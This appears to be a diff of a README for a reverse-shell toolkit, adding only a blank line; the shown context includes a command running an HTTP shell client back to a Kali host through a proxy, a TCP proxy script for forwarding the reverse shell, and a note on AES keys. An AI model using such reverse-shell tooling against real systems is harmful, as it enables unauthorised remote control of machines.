@@ -26,6 +26,7 @@ C:\client_shell_http.exe <kali_ip> <kali_port> <proxy_address> <Proxy_port>
 ```TCP_proxy_online.py``` - TCP proxy from https://stackoverflow.com/questions/32468270/tcp-proxy-using-python Purely the work of voorloop. You might need to modfy lines 16 and 94 to modify the forwarded reverseshell/port and the proxy port, respectively.
 
 ```get-pip.py``` To install pip for python2 (after deprecation). Reference: https://bootstrap.pypa.io/
+
 NB: If changing the AES encryption key, please ensure you change both the client and server scripts to match.
 
 ## COMMANDS:
